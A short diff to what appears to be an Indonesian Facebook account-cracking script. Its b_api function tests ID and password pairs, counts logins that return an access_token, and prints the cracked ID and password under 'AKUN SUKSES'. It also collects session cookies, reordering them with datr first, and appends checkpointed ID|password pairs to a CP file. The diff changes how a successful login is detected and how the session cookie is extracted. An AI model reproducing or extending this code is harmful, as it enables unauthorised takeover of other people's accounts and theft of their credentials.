@@ -1578,9 +1578,10 @@ def b_api(idf, pwv):
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
-            elif "session_key" in fannn:
+            elif "access_token" in fannn:
                 ok += 1
-                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
+                fannnnnn_cookies = sorted(q["session_cookies"], key=lambda x: (x["name"] != "datr", x["name"]))
+                kuki = ";".join(i["name"] + "=" + i["value"] for i in fannnnnn_cookies)
                 tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
